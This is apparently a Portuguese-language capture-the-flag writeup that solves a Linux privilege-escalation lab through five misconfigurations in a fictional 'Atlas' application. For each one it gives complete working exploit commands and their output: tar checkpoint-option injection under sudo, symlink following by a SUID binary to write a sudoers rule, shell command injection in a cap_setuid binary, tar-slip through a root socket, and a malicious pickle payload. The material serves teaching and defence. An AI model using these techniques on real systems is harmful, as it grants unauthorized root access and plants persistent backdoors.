# Writeup de Elevação de Privilégios no Linux (5 vetores)

Solução completa do [desafio](README.md). O container entrega a sessão do usuário comum
**`analista`** (`uid=1000`, sem sudo útil além de um binário) e esconde **cinco** falhas de
configuração independentes que levam a **`root`**.

>  **Spoiler.** Daqui pra frente tem solução. Tente sozinho antes.

Convenções deste writeup:

- Tudo é feito **de dentro da sessão de `analista`**, com ferramentas que já estão no
  container (`bash`, `sudo`, `tar`, `ln`, `getcap`, `python3`). Onde aparece o prompt
  `analista@priv-esc-lab:~$`, é a sessão comum, sem privilégio.
- Antes de cada vetor: **suba um container novo** (`docker run ...`). Cada caminho é
  independente e precisa funcionar sozinho, a partir do estado limpo.
- Os cinco caminhos levam direto a execução como root. A prova de cada um é objetiva: um
  comando rodando como `root` (`uid=0`/`euid=0`) obtido **por aquele caminho**.

## Reconhecimento inicial

Primeiro, saber quem somos e o que há de incomum no ambiente:

```text
analista@priv-esc-lab:~$ id
uid=1000(analista) gid=1000(analista) groups=1000(analista)

analista@priv-esc-lab:~$ sudo -n -l
Matching Defaults entries for analista on priv-esc-lab:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User analista may run the following commands on priv-esc-lab:
    (root) NOPASSWD: /usr/local/sbin/atlas-backup

analista@priv-esc-lab:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/sudo
/usr/local/bin/atlas-report

analista@priv-esc-lab:~$ getcap -r / 2>/dev/null
/usr/local/bin/atlas-inspect cap_setuid=ep

analista@priv-esc-lab:~$ ps -eo user,pid,cmd | grep -E 'root.*python' | grep -v grep
root           7  python3 /opt/atlas/restore-server.py
root           8  python3 /opt/atlas/metrics-worker.py
```

Isso já aponta os cinco candidatos, todos ligados à aplicação fictícia **Atlas**:

1. um binário autorizado via `sudo` sem senha (`/usr/local/sbin/atlas-backup`);
2. um binário **SUID root** fora do padrão (`/usr/local/bin/atlas-report`);
3. um binário com **capability** `cap_setuid` (`/usr/local/bin/atlas-inspect`);
4. e **5.** dois serviços rodando **como root** (`restore-server.py` e `metrics-worker.py`).

Os artefatos do Atlas ficam em `/srv/atlas` (com subpastas graváveis pelo `analista`) e em
`/opt/atlas`. É por ali que a investigação começa.

---

## Vetor 1: `sudo` em `atlas-backup` e injeção de opções no `tar`

**Problema.** O `analista` pode rodar `/usr/local/sbin/atlas-backup` como root, sem senha. O
script faz um `tar` com `*` (curinga) dentro de `/srv/atlas/inbox`, que é gravável por nós. O
GNU `tar` trata nomes de arquivo que começam com `--` como **opções**. Criando arquivos com
nomes de opção do `tar`, conseguimos que ele execute um programa nosso, e como o `tar` roda via
`sudo`, esse programa roda como root.

### Descoberta

```text
analista@priv-esc-lab:~$ cat /usr/local/sbin/atlas-backup
#!/bin/bash
set -euo pipefail
cd /srv/atlas/inbox
/usr/bin/tar -cf /var/backups/atlas-inbox.tar *
echo 'Backup criado em /var/backups/atlas-inbox.tar'

analista@priv-esc-lab:~$ ls -ld /srv/atlas/inbox
drwxr-xr-x 2 analista analista 4096 /srv/atlas/inbox
```

A pasta onde o `*` é expandido pertence ao `analista`. O ataque clássico é plantar os nomes
`--checkpoint=1` e `--checkpoint-action=exec=...`: na hora do backup, o `tar` interpreta esses
nomes como opções e executa a ação de checkpoint.

### Exploração

```text
analista@priv-esc-lab:~$ cd /srv/atlas/inbox
analista@priv-esc-lab:/srv/atlas/inbox$ printf 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n' > payload.sh
analista@priv-esc-lab:/srv/atlas/inbox$ touch -- '--checkpoint=1' '--checkpoint-action=exec=sh payload.sh'
analista@priv-esc-lab:/srv/atlas/inbox$ ls -la
total 16
-rw-r--r-- 1 analista analista    0 --checkpoint-action=exec=sh payload.sh
-rw-r--r-- 1 analista analista    0 --checkpoint=1
-rw-r--r-- 1 analista analista   53 payload.sh

analista@priv-esc-lab:/srv/atlas/inbox$ sudo -n /usr/local/sbin/atlas-backup
Backup criado em /var/backups/atlas-inbox.tar
```

O `payload.sh` copia o `bash` para `/tmp/rootbash` e marca o arquivo como **SUID root**. Como o
`tar` rodou como root, o `cp` e o `chmod` também rodaram como root.

### Evidência

```text
analista@priv-esc-lab:/srv/atlas/inbox$ ls -la /tmp/rootbash
-rwsr-xr-x 1 root root 1396520 /tmp/rootbash

analista@priv-esc-lab:/srv/atlas/inbox$ /tmp/rootbash -p -c id
uid=1000(analista) gid=1000(analista) euid=0(root) groups=1000(analista)
```

O `/tmp/rootbash -p` mantém o `euid=0`: temos um shell com privilégio de root, obtido só pelo
backup.

**Referência:** [GTFOBins: tar](https://gtfobins.github.io/gtfobins/tar/) · [CWE-88: Argument Injection](https://cwe.mitre.org/data/definitions/88.html)

---

## Vetor 2: binário SUID `atlas-report` que segue link simbólico

**Problema.** O `atlas-report` é **SUID root** e grava um relatório em
`/srv/atlas/reports/<NOME>.txt`. O nome é validado, mas a abertura do arquivo **segue link
simbólico** (não usa `O_NOFOLLOW`). Como a pasta `reports` é gravável pelo `analista`, podemos
deixar lá um link apontando para um arquivo sensível, por exemplo `/etc/sudoers.d/atlas-bridge`,
e o conteúdo que passarmos será escrito **como root** no destino do link.

### Descoberta

```text
analista@priv-esc-lab:~$ ls -la /usr/local/bin/atlas-report
-rwsr-xr-x 1 root root 16400 /usr/local/bin/atlas-report

analista@priv-esc-lab:~$ atlas-report
uso: atlas-report NOME TEXTO

analista@priv-esc-lab:~$ atlas-report diario "entrada de teste"
Relatorio salvo.

analista@priv-esc-lab:~$ ls -la /srv/atlas/reports
-rw-r--r-- 1 root analista 16 diario.txt
```

O arquivo gerado sai como **`root`** (dono `root`), confirmando que o binário escreve com
privilégio. E a pasta `reports` aceita arquivos nossos, então podemos plantar o link antes.

### Exploração

```text
analista@priv-esc-lab:~$ ln -s /etc/sudoers.d/atlas-bridge /srv/atlas/reports/prova.txt
analista@priv-esc-lab:~$ atlas-report prova 'analista ALL=(ALL) NOPASSWD: ALL'
Relatorio salvo.
```

O `atlas-report` abriu `/srv/atlas/reports/prova.txt`, seguiu o link e escreveu a regra de sudo
em `/etc/sudoers.d/atlas-bridge`, como root.

### Evidência

```text
analista@priv-esc-lab:~$ sudo -n id
uid=0(root) gid=0(root) groups=0(root)
```

Agora o `analista` tem `sudo` total e vira root na hora.

**Referência:** [CWE-61: UNIX Symbolic Link (Symlink) Following](https://cwe.mitre.org/data/definitions/61.html) · [open(2): O_NOFOLLOW](https://man7.org/linux/man-pages/man2/open.2.html)

---

## Vetor 3: capability `cap_setuid` em `atlas-inspect` e injeção de comando

**Problema.** O `atlas-inspect` tem a capability `cap_setuid=ep`: ele pode virar root por conta
própria (`setuid(0)`). Internamente ele chama `stat` **através de um shell** (`system()`),
concatenando o argumento que recebemos. Isso permite **injeção de comando**: o que vier depois
de um `;` é executado pelo shell, já como root.

### Descoberta

```text
analista@priv-esc-lab:~$ getcap /usr/local/bin/atlas-inspect
/usr/local/bin/atlas-inspect cap_setuid=ep

analista@priv-esc-lab:~$ atlas-inspect /etc/hostname
  File: /etc/hostname
  Size: 13        	Blocks: 8          IO Block: 4096   regular file
Device: fe01h/65025d	Inode: 782470      Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
```

O uso normal roda um `stat` no caminho informado. Como a saída vem de um `stat` disparado por
um shell, basta fechar o argumento e emendar um comando nosso.

### Exploração e evidência

```text
analista@priv-esc-lab:~$ atlas-inspect "x; id #"
/usr/bin/stat: cannot statx 'x': No such file or directory
uid=0(root) gid=1000(analista) groups=1000(analista)
```

O `stat` falha ao olhar o arquivo `x` (que não existe), e logo em seguida o `; id` roda **como
root** (`uid=0`). O `#` comenta o resto da linha montada pelo programa. No lugar do `id` caberia
qualquer comando, por exemplo um shell root.

**Referência:** [capabilities(7): CAP_SETUID](https://man7.org/linux/man-pages/man7/capabilities.7.html) · [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

---

## Vetor 4: serviço de restauração root com extração de TAR insegura

**Problema.** O `restore-server.py` roda **como root** e escuta no socket Unix
`/run/atlas-restore.sock`, que está com permissão `0666` (qualquer um escreve). Ele até
restringe o caminho do `.tar` (precisa estar em `/srv/atlas/drop` e terminar em `.tar`), mas
depois chama `tarfile.extractall()` **sem validar os membros**. Um membro com `../` escapa da
pasta de destino e é escrito em qualquer lugar, como root. É o *tar slip* (CVE-2007-4559). Com
ele, sobrescrevemos `/etc/sudoers.d/atlas-bridge`.

### Descoberta

```text
analista@priv-esc-lab:~$ ls -la /run/atlas-restore.sock
srw-rw-rw- 1 root root 0 /run/atlas-restore.sock

analista@priv-esc-lab:~$ cat /opt/atlas/restore-server.py
#!/usr/bin/env python3
import json
import os
import socket
import tarfile

SOCKET = '/run/atlas-restore.sock'
DROP = '/srv/atlas/drop/'
DESTINATION = '/var/lib/atlas/restore'
...
            if not archive.startswith(DROP) or not archive.endswith('.tar'):
                raise ValueError('arquivo fora da area de entrada')
            with tarfile.open(archive, 'r') as bundle:
                bundle.extractall(DESTINATION)
            client.sendall(b'{"status":"ok"}\n')
```

O socket é gravável por nós e o `extractall` não sana os caminhos dos membros. A pasta
`/srv/atlas/drop` também é nossa, então é lá que montamos o `.tar`.

### Exploração

Montamos um `.tar` cujo único membro é `../../../../etc/sudoers.d/atlas-bridge`, com uma regra
de sudo, e pedimos a restauração pelo socket:

```text
analista@priv-esc-lab:~$ python3 - <<'PY'
import io, json, socket, tarfile
archive = '/srv/atlas/drop/prova.tar'
data = b'analista ALL=(ALL) NOPASSWD: ALL\n'
with tarfile.open(archive, 'w') as bundle:
    info = tarfile.TarInfo('../../../../etc/sudoers.d/atlas-bridge')
    info.size = len(data)
    info.mode = 0o440
    bundle.addfile(info, io.BytesIO(data))
with socket.socket(socket.AF_UNIX) as client:
    client.connect('/run/atlas-restore.sock')
    client.sendall((json.dumps({'action': 'restore', 'archive': archive}) + '\n').encode())
    print(client.recv(4096).decode().strip())
PY
{"status":"ok"}
```

O serviço root extraiu o arquivo e o `../` fez o membro cair em `/etc/sudoers.d/atlas-bridge`.

### Evidência

```text
analista@priv-esc-lab:~$ sudo -n id
uid=0(root) gid=0(root) groups=0(root)
```

**Referência:** [CVE-2007-4559: Python tarfile directory traversal](https://nvd.nist.gov/vuln/detail/CVE-2007-4559) · [Python tarfile: extractall](https://docs.python.org/3/library/tarfile.html#tarfile.TarFile.extractall)

---

## Vetor 5: desserialização de `pickle` em rotina root

**Problema.** O `metrics-worker.py` roda **como root** e, num laço, faz `pickle.load()` do
arquivo `/srv/atlas/metrics/cache.pkl` a cada 5 segundos. A pasta `metrics` é gravável pelo
`analista`. Desserializar `pickle` de fonte não confiável é execução de código: um objeto com
`__reduce__` roda um comando nosso, e aqui ele roda como root.

### Descoberta

```text
analista@priv-esc-lab:~$ cat /opt/atlas/metrics-worker.py
#!/usr/bin/env python3
import os
import pickle
import time

CACHE = '/srv/atlas/metrics/cache.pkl'
while True:
    if os.path.isfile(CACHE):
        try:
            with open(CACHE, 'rb') as stream:
                pickle.load(stream)
        except Exception:
            pass
    time.sleep(5)

analista@priv-esc-lab:~$ ls -ld /srv/atlas/metrics
drwxr-xr-x 2 analista analista 4096 /srv/atlas/metrics
```

O worker root lê um `pickle` de uma pasta nossa. Basta escrever um `cache.pkl` malicioso e
esperar o próximo ciclo.

### Exploração

```text
analista@priv-esc-lab:~$ python3 - <<'PY'
import os, pickle
class Payload:
    def __reduce__(self):
        return (os.system, ('cp /bin/bash /srv/atlas/metrics/rb5; chmod 4755 /srv/atlas/metrics/rb5',))
with open('/srv/atlas/metrics/cache.pkl', 'wb') as stream:
    pickle.dump(Payload(), stream)
PY
analista@priv-esc-lab:~$ sleep 6
```

Na próxima leitura, o worker root desserializa o objeto e executa o comando do `__reduce__`,
criando um `bash` SUID root.

### Evidência

```text
analista@priv-esc-lab:~$ ls -la /srv/atlas/metrics/rb5
-rwsr-xr-x 1 root root 1396520 /srv/atlas/metrics/rb5

analista@priv-esc-lab:~$ /srv/atlas/metrics/rb5 -p -c id
uid=1000(analista) gid=1000(analista) euid=0(root) groups=1000(analista)
```

**Referência:** [Python pickle: aviso de segurança](https://docs.python.org/3/library/pickle.html) · [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)

---

## Resumo

| # | Vetor | Falha | Técnica | Resultado |
|---|-------|-------|---------|-----------|
| L1 | `sudo` em `atlas-backup` | `tar *` numa pasta gravável interpreta nomes `--` como opções | plantar `--checkpoint-action=exec=` e rodar o backup | root: `bash` SUID |
| L2 | SUID `atlas-report` | abre o arquivo seguindo link simbólico (sem `O_NOFOLLOW`) | link em `reports` apontando para `sudoers.d` | root: regra de sudo |
| L3 | capability `cap_setuid` | `atlas-inspect` vira root e passa a entrada por um shell | injeção de comando com `;` | root: `uid=0` direto |
| L4 | serviço root `restore-server` | socket `0666` + `extractall()` sem sanear membros | `.tar` com membro `../` sobre `sudoers.d` | root: regra de sudo |
| L5 | serviço root `metrics-worker` | `pickle.load()` de cache gravável pelo usuário | `__reduce__` com comando | root: `bash` SUID |

**Lição comum:** nenhum dos cinco caminhos precisou de um *exploit* de corrupção de memória ou de
uma falha exótica. A superfície vem de escolhas de configuração e deploy (sudo amplo demais, bit
SUID, capability desnecessária, serviços rodando como root), e a falha explorada em cada caso é um
padrão inseguro de implementação (abrir arquivo seguindo link simbólico, montar comando de shell
com a entrada do usuário, extrair TAR sem validar membros, desserializar dados não confiáveis). É
o feijão com arroz da elevação de privilégios local no Linux: enumerar com o que já existe no
sistema, entender *quem roda o quê como root*, e transformar uma permissão de escrita num contexto
privilegiado de execução.
